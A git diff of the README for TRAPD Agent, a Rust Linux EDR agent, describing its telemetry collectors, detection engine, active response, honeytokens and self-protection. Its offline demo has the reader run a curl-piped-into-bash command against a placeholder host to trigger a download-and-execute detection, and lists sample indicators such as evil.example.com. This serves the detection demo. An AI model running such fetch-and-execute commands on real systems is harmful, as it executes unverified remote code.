@@ -1,6 +1,243 @@
 # TRAPD Agent
 
-TRAPD Agent is a lightweight Linux security telemetry agent written in Rust. It continuously monitors process activity, network connections, filesystem changes, and system health, streaming structured NDJSON events to a TRAPD backend or local log file.
+TRAPD Agent is a lightweight Linux **EDR** (Endpoint Detection & Response) and
+security-telemetry agent written in Rust. It does far more than collect logs: it
+continuously observes process, network, filesystem, user and kernel activity —
+optionally down to the syscall level via **eBPF** — runs a platform-neutral
+**detection engine** over that stream, can **actively respond** to threats
+(kill, quarantine, isolate, block) on signed backend command, plants and watches
+**honeytokens** (deception), and **protects itself** from tampering.
+
+It streams structured NDJSON events to a TRAPD backend, or runs fully **offline**
+writing telemetry to a local file — so you can drop it on any Linux box and see
+what it does in seconds, with no backend at all.
+
+```
+                         ┌──────────────────────────────────────────────┐
+                         │                 trapd-agent                   │
+                         │                                               │
+  kernel  ─ eBPF ──────► │  collectors ─┐                                │
+  /proc   ─ poll ──────► │  (telemetry) │                                │
+  auth.log ────────────► │              ▼                                │
+  inotify  ────────────► │        event pipeline ──► detection engine    │
+                         │              │  (ring buffer)   │ (findings)   │
+                         │              ▼                  ▼              │
+                         │   local NDJSON / backend     prevention engine │
+                         │        ingest                 (active response)│
+                         │                                  ▲             │
+                         │   self-protection           signed commands    │
+                         │   (watchdog, anti-ptrace,    from backend       │
+                         │    integrity, hardening)                        │
+                         └──────────────────────────────────────────────┘
+```
+
+---
+
+## Table of contents
+
+- [What the agent does](#what-the-agent-does)
+- [Architecture & data flow](#architecture--data-flow)
+- [Capabilities in detail](#capabilities-in-detail)
+  - [1. Telemetry collection](#1-telemetry-collection)
+  - [2. Detection engine](#2-detection-engine)
+  - [3. Prevention / active response](#3-prevention--active-response)
+  - [4. Deception (honeytokens)](#4-deception-honeytokens)
+  - [5. Self-protection](#5-self-protection)
+  - [6. Asset inventory](#6-asset-inventory)
+- [Runtime modes: online vs. offline](#runtime-modes-online-vs-offline)
+- [Installation](#installation)
+- [Configuration](#configuration)
+- [Event schema](#event-schema)
+- [Hands-on example: catch a download-and-execute chain offline](#hands-on-example-catch-a-download-and-execute-chain-offline)
+- [Building from source](#building-from-source)
+- [Backend API](#backend-api)
+- [Updating](#updating)
+- [Releasing a new version](#releasing-a-new-version)
+- [Repository layout](#repository-layout)
+
+---
+
+## What the agent does
+
+| Pillar | What it gives you |
+|--------|-------------------|
+| **Telemetry** | Process, network, system, filesystem, user-logon and (with eBPF) rich syscall-level events — exec, fork, file open/unlink/rename/chmod/chown, mmap, ptrace, kernel-module load, setuid, DNS, IPC/shm, namespace changes, kill attempts. |
+| **Detection** | A userspace, platform-neutral analytics engine: IOC matching (hashes/IPs/domains), ATT&CK-mapped behavioural heuristics, C2 **beaconing** detection, **DNS-tunnelling** detection, port-scan / lateral-movement / cloud-metadata recon detection. Each finding is a first-class event. |
+| **Prevention** | Active response driven by **Ed25519-signed** backend commands or local IoC rules: kill PID, quarantine/restore file, isolate/de-isolate host network, block/unblock IP, hot-reload policy, manage packages. Every action is reversible and audited. |
+| **Deception** | Builds a per-host **recon profile** of plausible secret locations (SSH keys, AWS creds, `.kube/config`, …), deploys backend-generated **honeytokens** with camouflage, and (with eBPF) fires a `critical` detection the instant one is touched — with the accessor's full process lineage. |
+| **Self-protection** | Watchdog subprocess (auto-restart), anti-ptrace detection, binary self-integrity verification (optionally Ed25519-signed), kernel-hardening audit, plus a self-tamper collector. |
+| **Fleet management** | First-run enrollment, heartbeat metrics, remote config pull with ETag, signed command pull, asset inventory, and a daily self-updater. |
+
+---
+
+## Architecture & data flow
+
+The agent is a single Tokio async binary (`trapd-agent`). On startup
+(`agent/src/main.rs`) it:
+
+1. **Self-protects first** — runs the watchdog, audits kernel hardening, verifies
+   its own binary integrity, then spawns a detached watchdog child.
+2. **Establishes identity** — loads/creates a persistent `device_id`, then either
+   enrolls with the backend (online) or runs offline.
+3. **Starts collectors** — each implements the `Collector` trait and pushes
+   `AgentEvent`s into a shared **mpsc pipeline**. eBPF collectors are spawned only
+   if the compiled eBPF object is present; otherwise the agent degrades gracefully
+   to `/proc` polling.
+4. **Consumes the pipeline** — a single consumer task:
+   - writes each event locally (NDJSON to stdout or file) and into a **ring
+     buffer** for backend ingest;
+   - runs each event through the **detection engine**; findings are re-injected as
+     new events;
+   - **tees** both raw events and findings into the **prevention engine**.
+5. **Talks to the backend** (online only) — transport (batched event ingest),
+   heartbeat, config puller, command puller, inventory reporter.
+
+Everything is **platform-neutral above the collector layer**: the detection and
+prevention engines operate on the shared `schema::AgentEvent` type, so a future
+Windows agent can reuse them unchanged — only how raw telemetry is gathered differs.
+
+---
+
+## Capabilities in detail
+
+### 1. Telemetry collection
+
+Collectors live in `agent/src/collectors/linux/`. Two tiers:
+
+**Polling / log collectors (always available, no special kernel support):**
+
+| Collector | Source | Emits |
+|-----------|--------|-------|
+| `SystemCollector` | `sysinfo` / `/proc` | `system/snapshot` (CPU, mem, uptime, load, OS, kernel) — startup + every 60 s |
+| `ProcessCollector` | `/proc` diff | `process/create`, `process/terminate` — every 3 s |
+| `NetworkCollector` | `/proc/net` | `network/connection` (proto, src/dst, state, owning PID) — every 5 s |
+| `AuthLogCollector` | `/var/log/auth.log` | `user/logon`, `user/logon_failed`, `user/session_open`, `user/session_close` |
+| `FilesystemCollector` | `inotify` | `filesystem/create|delete|modify` under watched paths (`/etc`, `/bin`, `/tmp` by default) |
+| `AgentProtectCollector` | agent's own files | `agent_tamper` events |
+
+**eBPF collectors (when the eBPF object is built & installed; see
+[Building from source](#building-from-source)):**
+
+| Collector | Kernel hooks | Emits |
+|-----------|--------------|-------|
+| `EbpfExecCollector` | `sched_process_exec` | rich `process/exec` (uid/gid, cwd, full cmdline, container id) |
+| `EbpfSyscallCollector` | many tracepoints | `fork`, `file open/unlink/rename/chmod/chown`, `mmap`, `ptrace`, `module_load`, `setuid`, `dns_query`, `shm`, `ns_change`, `kill_attempt`, `memfd`, and honeytoken-access detection |
+
+The kernel-side programs are in the standalone `trapd-agent-ebpf` crate
+(`exec`, `fork`, `network`, `dns`, `file_open`, `file_manip`, `write`, `mmap`,
+`ptrace`, `kill`, `module_load`, `setuid`, `shm`, `memfd`, `namespace`,
+`process_block`).
+
+### 2. Detection engine
+
+`agent/src/detection/` — runs synchronously in the consumer, allocation-light,
+never blocks the pipeline. Every collected event is passed through
+`DetectionEngine::inspect()`, which returns zero or more `class=detection`
+findings (each carrying a MITRE ATT&CK mapping, a confidence score and evidence):
+
+- **IOC matching** (`ioc.rs`) — O(1) lookups against `<config>/iocs.json`
+  (SHA256 hashes, destination IPs, exact domains + parent-domain suffixes). The
+  feed is hot-reloaded every 5 minutes — no restart needed.
+- **Behavioural heuristics** (`behavior.rs`) — signature-free, pure functions over
+  process command lines (e.g. shell spawning a downloader → download-and-execute
+  chain). Each maps to an ATT&CK technique.
+- **C2 beaconing** (`beaconing.rs`) — flags clockwork-regular connections to a
+  destination (low coefficient-of-variation in inter-arrival times).
+- **DNS tunnelling** (`dns_tunnel.rs`) — flags long high-cardinality sub-domain
+  labels or high look-up rates under one registrable domain.
+- **Recon / lateral movement** (`netscan.rs`) — port scans, address sweeps on
+  admin ports (SSH/SMB/RDP/WinRM), and cloud-metadata (`169.254.169.254`) access.
+- **Honeytoken access** (`honeytoken.rs`) — see [Deception](#4-deception-honeytokens).
+- **YARA** (`yara_scanner.rs`, optional `--features yara`) — file scanning when
+  the `libyara` C library is available at build time.
+
+### 3. Prevention / active response
+
+`agent/src/prevention/` — the "R" in EDR. Where collectors are read-only, this
+subsystem *takes action*. Every action is:
+
+1. **Authorised** — by a local IoC rule (`<config>/policy.json`) or an
+   **Ed25519-signed** command from the backend, verified against
+   `<config>/command_signing.pub`, with expiry windows and a replay-protected
+   nonce store.
+2. **Audited** — emitted as a `class=prevention` event into the normal pipeline,
+   giving the backend a tamper-evident record.
+3. **Reversible** — every quarantine has a restore, every isolation a de-isolation,
+   every IP block an unblock.
+
+Supported actions (`CommandPayload.kind`): `kill_pid`, `quarantine_file` /
+`restore_file`, `isolate_network` / `deisolate_network` (iptables/nftables, with a
+backend allowlist so the host can still reach TRAPD), `block_ip` / `unblock_ip`
+(optional TTL), `update_policy` (hot-reload IoC rules), `install_package` /
+`remove_package` / `upgrade_package`, and `deploy_honeytoken` / `revoke_honeytoken`.
+An optional LSM loader (`lsm_loader.rs`) syncs policy into a kernel enforcement layer.
+
+### 4. Deception (honeytokens)
+
+`agent/src/deception/` — plant believable bait and catch whoever reads it.
+
+- **Profiling** (`profiler.rs`) — condenses the asset inventory into a
+  **recon profile**: the secret artefacts an attacker would expect on *this*
+  host (MITRE **T1552** Unsecured Credentials / **T1083** Discovery), e.g.
+  `~/.aws/credentials` only if `awscli` is installed, `~/.kube/config`,
+  `.pgpass`, `.my.cnf`, `id_rsa`, web-root `.env`, `passwords.kdbx`, shell
+  history. Candidates are scored and sent to the backend.
+- **Placement** (`mod.rs`) — the backend's LLM generates host-specific content
+  (no LLM ever runs on the endpoint) and issues a signed `deploy_honeytoken`.
+  The agent writes it with **camouflage**: explicit file mode, and with
+  `mimic_neighbor` it copies a sibling's owner/group and atime/mtime so the bait
+  doesn't look freshly planted. Safety invariants: paths must be absolute with no
+  `..`, it **never overwrites** an existing file, and **revoke only removes what
+  the agent itself planted** (tracked in `<state>/honeytokens.json`).
+- **Detection & response** — an eBPF map (`HONEYTOKEN_PATHS`) is armed from the
+  on-disk register every 15 s. Any open of a token — **even read-only** — fires a
+  `class=detection, action=honeytoken_access`, `severity=critical` event
+  (confidence always 100, since no legitimate workflow reads a honeytoken),
+  enriched with the accessor's full `/proc` **process lineage**. The prevention
+  engine then reacts per the `honeytoken_response` policy: `none` < `alert` <
+  `kill` (SIGKILL the accessor) < `isolate` (full network isolation). A built-in
+  allowlist suppresses benign sweepers (mlocate/updatedb, AV, backup tools, the
+  agent itself).
+
+### 5. Self-protection
+
+`agent/src/selfprotect/`:
+
+- **Watchdog** (`watchdog.rs`) — a detached child (`setsid`) polls `/proc/<pid>`
+  and re-launches the agent if it dies, CrowdStrike-style; combined with systemd
+  `Restart=always` the chain is never permanently broken.
+- **Anti-ptrace** (`anti_ptrace.rs`) — polls `/proc/self/status` `TracerPid`; a
+  non-zero value (someone attached a debugger) emits a `critical` `agent_tamper`
+  event. Defence-in-depth fallback to the eBPF `sys_enter_ptrace` hook.
+- **Binary integrity** (`binary_integrity.rs`) — verifies the SHA256 of
+  `/proc/self/exe` against a stored baseline on every start, optionally checking
+  an Ed25519 signature; a mismatch aborts the agent.
+- **Kernel hardening audit** (`kernel_hardening.rs`) — advisory check of
+  `/proc/sys/kernel/*` security parameters at startup.
+
+### 6. Asset inventory
+
+`agent/src/inventory/` — a full host profile (OS, hardware, disks, network
+interfaces, installed packages, user accounts) plus the deception recon profile.
+Sent to the backend 15 s after startup and every 6 hours; offline it's written to
+`<state>/inventory.json` so the asset profile is still inspectable on a test box.
+
+---
+
+## Runtime modes: online vs. offline
+
+The agent auto-detects its mode so a bare `trapd-agent` run "just works":
+
+- **Online** — requires `TRAPD_BACKEND_URL` (and `TRAPD_ENROLL_TOKEN` on first
+  run). Enables enrollment, batched event ingest, heartbeat, config pull, signed
+  command pull, inventory POST, and the prevention subsystem.
+- **Offline** — enabled by `TRAPD_OFFLINE=1` *or* simply by leaving
+  `TRAPD_BACKEND_URL` unset. All backend channels are skipped; telemetry and
+  detections are emitted locally only. Ideal for testing/forensics on an isolated
+  box. (Prevention's signed-command path needs the backend, so active response is
+  disabled offline — local IoC policy still loads.)
+
+---
 
 ## Installation
 
@@ -8,52 +245,120 @@ TRAPD Agent is a lightweight Linux security telemetry agent written in Rust. It 
 curl -sSL https://raw.githubusercontent.com/trapd-cloud/trapd-agent/main/deploy/install.sh | sudo bash
 ```
 
-The installer fetches the latest release binary from GitHub, installs it to `/usr/local/bin/trapd-agent`, registers a systemd service, and sets up a daily auto-update timer.
+The installer fetches the latest release binary from GitHub, installs it to
+`/usr/local/bin/trapd-agent`, registers a hardened systemd service, and sets up a
+daily auto-update timer.
+
+The systemd unit (`deploy/trapd-agent.service`) runs the agent locked down with
+`ProtectSystem=strict`, `ProtectHome=true`, `NoNewPrivileges=true`,
+`MemoryDenyWriteExecute=true`, a tight `SystemCallFilter`, and only the
+capabilities it genuinely needs (`CAP_NET_ADMIN`, `CAP_BPF`, `CAP_PERFMON`,
+`CAP_SYS_PTRACE`, `CAP_NET_RAW`, `CAP_IPC_LOCK`, `CAP_LINUX_IMMUTABLE`).
+
+---
 
 ## Configuration
 
-Edit `/etc/trapd/agent.env` after installation:
-
-```sh
-nano /etc/trapd/agent.env
-```
+Edit `/etc/trapd/agent.env` after installation, then `systemctl restart trapd-agent`:
 
 ```ini
 # Required for a backend-connected agent: URL of your TRAPD backend.
-# If omitted (or with TRAPD_OFFLINE=1) the agent runs in OFFLINE mode and only
-# writes telemetry locally — handy for testing on a fresh box.
+# If omitted (or with TRAPD_OFFLINE=1) the agent runs OFFLINE and only writes
+# telemetry locally — handy for testing on a fresh box.
 TRAPD_BACKEND_URL=https://your-backend.com
 
 # First-run enrollment token from the dashboard. Once enrolled, durable
 # credentials are stored in the state dir and this is no longer needed.
 TRAPD_ENROLL_TOKEN=enroll_xxxx
 
-# Optional: output destination — "file" writes to $TRAPD_LOG_DIR/events.ndjson
+# Optional: output destination — "file" writes to $TRAPD_LOG_DIR/events.ndjson;
+# anything else (or unset) writes NDJSON to stdout.
 TRAPD_OUTPUT=file
 
 # Optional: log verbosity (default: info)
 RUST_LOG=info
 
+# Optional: force offline mode even when a backend URL is set.
+#TRAPD_OFFLINE=1
+
 # Optional: cap enrollment retries (0 / unset = retry forever, never crash-loop)
 #TRAPD_ENROLL_MAX_ATTEMPTS=0
 ```
+
+Most behaviour (poll intervals, enabled collectors, watched FS paths, prevention
+toggle, honeytoken response level, isolation allowlist) is delivered at runtime
+by the backend via the config-pull endpoint (`AgentConfig`) and can change
+without a restart.
 
 ### Filesystem layout
 
 The agent keeps state, config and logs in fixed, `$HOME`-independent locations
 (each overridable via an env var). This is what makes it run reliably under a
-hardened systemd unit, where `$HOME` is not set:
+hardened systemd unit where `$HOME` is not set.
 
-| Kind   | Default          | Override env       | Contents                          |
-|--------|------------------|--------------------|-----------------------------------|
-| state  | `/var/lib/trapd` | `TRAPD_STATE_DIR`  | `device_id`, `credentials.json`   |
-| config | `/etc/trapd`     | `TRAPD_CONFIG_DIR` | `agent.env`, `policy.json`, certs |
-| logs   | `/var/log/trapd` | `TRAPD_LOG_DIR`    | `events.ndjson`                   |
+| Kind   | Default          | Override env       | Contents                                                            |
+|--------|------------------|--------------------|---------------------------------------------------------------------|
+| state  | `/var/lib/trapd` | `TRAPD_STATE_DIR`  | `device_id`, `credentials.json`, command nonces, FIM baselines, `honeytokens.json`, quarantine, `inventory.json` (offline) |
+| config | `/etc/trapd`     | `TRAPD_CONFIG_DIR` | `agent.env`, `policy.json`, `iocs.json`, `command_signing.pub`, TLS certs |
+| logs   | `/var/log/trapd` | `TRAPD_LOG_DIR`    | `events.ndjson`                                                     |
 
-### Quick local test (no backend)
+The state dir is hardened to `0700`; credentials are written atomically at `0600`.
+
+---
+
+## Event schema
+
+Every event — collected, detection, or prevention — shares one envelope:
+
+```json
+{
+  "event_id":  "uuid-v4",
+  "agent_id":  "uuid-v4",
+  "hostname":  "myserver",
+  "timestamp": "2026-06-01T14:32:01.123Z",
+  "class":     "process|network|system|user|filesystem|memory|kernel|ipc|prevention|detection",
+  "action":    "create|exec|connection|detected|honeytoken_access|...",
+  "severity":  "info|low|medium|high|critical",
+  "data":      { }
+}
+```
+
+`data` is **untagged** — route and validate it on the backend by `class` + `action`
+(e.g. `process/create` → `ProcessCreateData`, `detection/detected` → `DetectionData`,
+`prevention/*` → `PreventionEventData`). The complete catalogue of payload schemas,
+event actions, command/policy/inventory schemas and backend endpoint contracts is
+maintained in **[`AGENTS.md`](AGENTS.md)** — that file is the authoritative
+backend API reference.
+
+A small sample of what the agent emits:
+
+| Event class  | Action(s)                       | Example data |
+|--------------|---------------------------------|--------------|
+| `process`    | `create`, `terminate`, `exec`   | PID/PPID, name, exe, cmdline, uid, username, cwd |
+| `network`    | `connection`, `dns_query`       | protocol, src/dst addr+port, state, owning PID |
+| `system`     | `snapshot`                      | CPU %, mem, uptime, load avg, OS, kernel |
+| `filesystem` | `create`, `delete`, `modify`    | path |
+| `user`       | `logon`, `session_open/close`   | username, source IP, auth method, success |
+| `detection`  | `detected`, `honeytoken_access` | rule id, ATT&CK mapping, confidence, evidence, accessor lineage |
+| `prevention` | `process_blocked`, `file_quarantined`, `network_isolated`, … | kind, target, success, reason, rule/command id |
+
+---
+
+## Hands-on example: catch a download-and-execute chain offline
+
+This walks through running the agent **with no backend** and watching its
+behavioural detection engine flag a classic LOLBin attack pattern (a shell
+spawning a network downloader → MITRE T1059 / T1105).
+
+**1. Build the agent:**
 
 ```sh
-# Runs offline, emits NDJSON telemetry to ./trapd-test/log/events.ndjson
+cargo build --release --manifest-path agent/Cargo.toml
+```
+
+**2. Run it offline, writing NDJSON to a local file:**
+
+```sh
 mkdir -p trapd-test/{state,cfg,log}
 TRAPD_STATE_DIR=$PWD/trapd-test/state \
 TRAPD_CONFIG_DIR=$PWD/trapd-test/cfg \
@@ -62,50 +367,72 @@ TRAPD_OUTPUT=file RUST_LOG=info \
   ./target/release/trapd-agent
 ```
 
-Apply changes:
+You'll see it start in **OFFLINE** mode and bring up the collectors and the
+detection engine. Leave it running.
+
+**3. In a second terminal, generate suspicious activity** — a shell invoking a
+downloader, which the behavioural heuristic recognises as a download-and-execute
+chain:
 
 ```sh
-systemctl restart trapd-agent
+bash -c "curl -s https://example.com/payload.sh | bash"
 ```
 
-## Collected Telemetry
+**4. Tail the telemetry and filter for detections:**
 
-| Event class  | Event type         | Data collected                                              | Frequency         |
-|--------------|--------------------|-------------------------------------------------------------|-------------------|
-| `process`    | `create`           | PID, name, exe path, cmdline, UID, username, PPID           | Every 3 s         |
-| `process`    | `terminate`        | PID, name                                                   | Every 3 s         |
-| `network`    | `connection`       | Protocol, src/dst address+port, state, PID, process name    | Every 5 s         |
-| `system`     | `snapshot`         | CPU %, memory used/total, uptime, load avg, OS, kernel      | Startup + 60 s    |
-| `filesystem` | `create/delete/modify` | File path under `/etc`, `/bin`, `/tmp`                  | On change (inotify) |
-| `user`       | `logon`            | Username, source IP, auth method, success/failure           | On auth.log entry |
-| `user`       | `session_open/close` | Username                                                  | On auth.log entry |
+```sh
+tail -f trapd-test/log/events.ndjson | grep '"class":"detection"'
+```
 
-All events share a common envelope:
+You'll see a detection event roughly like:
 
 ```json
 {
-  "event_id":  "uuid-v4",
-  "agent_id":  "uuid-v4",
-  "hostname":  "myserver",
-  "timestamp": "2025-04-30T14:32:01.123Z",
-  "class":     "process",
-  "action":    "create",
-  "severity":  "info",
-  "data":      {}
+  "class": "detection",
+  "action": "detected",
+  "severity": "high",
+  "data": {
+    "rule_id": "lolbin.download_pipe_shell",
+    "title": "Download piped directly into a shell",
+    "category": "lolbin",
+    "mitre_tactic": "TA0002 Execution",
+    "mitre_technique": "T1059.004",
+    "confidence": 75,
+    "subject": "/usr/bin/bash",
+    "detail": "Shell bash downloads and executes in one step: curl -s https://example.com/payload.sh | bash",
+    "evidence": { "cmdline": "curl -s https://example.com/payload.sh | bash" }
+  }
 }
 ```
 
-## Manual Update
+> Severity is derived from `confidence` (`0–39` low, `40–69` medium, `70–89` high,
+> `90+` critical), so this `confidence: 75` finding is reported as `high`.
 
-Run the updater at any time:
+**5. (Optional) Try the IOC feed.** Drop a known-bad indicator into
+`trapd-test/cfg/iocs.json` and the engine hot-reloads it within ~5 minutes:
 
-```sh
-sudo trapd-update
+```json
+{
+  "ips": ["203.0.113.66"],
+  "domains": ["evil.example.com"],
+  "hashes": ["3b7c…<sha256 of a binary>"]
+}
 ```
 
-The updater compares the installed version against the latest GitHub release and replaces the binary atomically if a newer version is available. A systemd timer also runs `trapd-update` automatically every day at 03:00.
+Any process exec whose binary hashes to that value, or any connection/DNS query to
+those indicators, now produces an IOC detection event.
 
-## Building from Source
+> **Going further (online):** point `TRAPD_BACKEND_URL` at a TRAPD backend and set
+> `TRAPD_ENROLL_TOKEN`. The same detection that just fired locally would also be
+> shipped to the backend, which could respond with a signed `kill_pid` or
+> `isolate_network` command — the prevention engine executes it and audits the
+> result back as a `prevention` event.
+
+---
+
+## Building from source
+
+**Agent (standard build, no native dependencies):**
 
 ```sh
 # Requires Rust 1.75+ and a Linux x86_64 host
@@ -113,11 +440,101 @@ cargo build --release --manifest-path agent/Cargo.toml
 cp target/release/trapd-agent /usr/local/bin/trapd-agent
 ```
 
-## Releasing a New Version
+**Run the test suite / linter:**
 
 ```sh
-git tag v0.2.0
-git push origin v0.2.0
+cargo test   --manifest-path agent/Cargo.toml
+cargo clippy --manifest-path agent/Cargo.toml -- -D warnings
 ```
 
-The `release` GitHub Actions workflow triggers on tag push, builds the release binary, and publishes it to GitHub Releases. The auto-updater on installed agents will pick it up within 24 hours.
+**Optional YARA support:**
+
+```sh
+# Requires the libyara C library + headers at build time
+cargo build --release --manifest-path agent/Cargo.toml --features yara
+```
+
+**eBPF programs (kernel-side telemetry):** the `trapd-agent-ebpf` crate lives
+outside the workspace because it targets `bpfel-unknown-none` and needs a pinned
+nightly toolchain. Build it with the xtask helper:
+
+```sh
+cargo install bpf-linker            # one-time
+cargo xtask build-ebpf --release    # pinned nightly + rust-src installed automatically
+```
+
+If the compiled eBPF object isn't present, the agent logs a warning and runs in
+polling-only mode — exec and syscall-level events are simply unavailable, nothing
+crashes.
+
+---
+
+## Backend API
+
+The agent speaks a small REST contract to the backend. Full request/response
+schemas, auth, cadences and serialization rules live in **[`AGENTS.md`](AGENTS.md)**.
+At a glance:
+
+| Endpoint | Auth | Purpose / cadence |
+|----------|------|-------------------|
+| `POST /api/v1/agents/enroll` | none | First-run; returns `agent_id` + `agent_secret` |
+| `POST /api/v1/ingest/events` | bearer | Batched event array (≤100), flushed every 5 s |
+| `POST /api/v1/agents/{id}/heartbeat` | bearer | Liveness + host metrics, every 30 s |
+| `GET /api/v1/agents/{id}/config` | bearer | Remote config with `ETag`/`304`, every 60 s |
+| `GET /api/v1/agents/{id}/commands` | bearer | Ed25519-signed response commands |
+| `POST /api/v1/agents/{id}/inventory` | bearer | Asset + recon profile, 15 s after start then every 6 h |
+
+All authenticated calls use `Authorization: Bearer <agent_secret>` over rustls,
+with optional CA pinning and mTLS from the config dir. **Commands are rejected
+unless they carry a valid Ed25519 signature, match this `agent_id`, fall within
+their expiry window, and present a fresh (non-replayed) nonce.**
+
+---
+
+## Updating
+
+```sh
+sudo trapd-update
+```
+
+The updater compares the installed version against the latest GitHub release and
+replaces the binary atomically if a newer version is available. A systemd timer
+also runs `trapd-update` automatically every day at 03:00.
+
+---
+
+## Releasing a new version
+
+```sh
+git tag v0.4.0
+git push origin v0.4.0
+```
+
+The `release` GitHub Actions workflow triggers on tag push, builds the release
+binary, and publishes it to GitHub Releases. Installed agents pick it up within
+24 hours via the auto-updater.
+
+---
+
+## Repository layout
+
+```
+agent/                     Main trapd-agent binary (workspace member)
+  src/
+    main.rs                Startup, pipeline wiring, mode selection
+    schema/                AgentEvent envelope + all payload schemas
+    collectors/linux/      Telemetry collectors (polling + eBPF)
+    detection/             IOC + behavioural + beaconing/DNS/recon engine
+    prevention/            Active response: kill, quarantine, isolate, block
+    deception/             Honeytoken profiling, placement, registry
+    selfprotect/           Watchdog, anti-ptrace, integrity, hardening
+    enrollment/ http/ transport/ heartbeat/ config/ inventory/ output/ paths/
+trapd-agent-ebpf/          Kernel-side eBPF programs (separate toolchain)
+xtask/                     `cargo xtask build-ebpf` helper
+deploy/                    install.sh, hardened systemd unit, logrotate
+AGENTS.md                  Authoritative backend API & schema reference
+```
+
+For contributor and backend-integration details — every event action, payload
+schema, command/policy/inventory format and endpoint contract — see
+**[`AGENTS.md`](AGENTS.md)**.
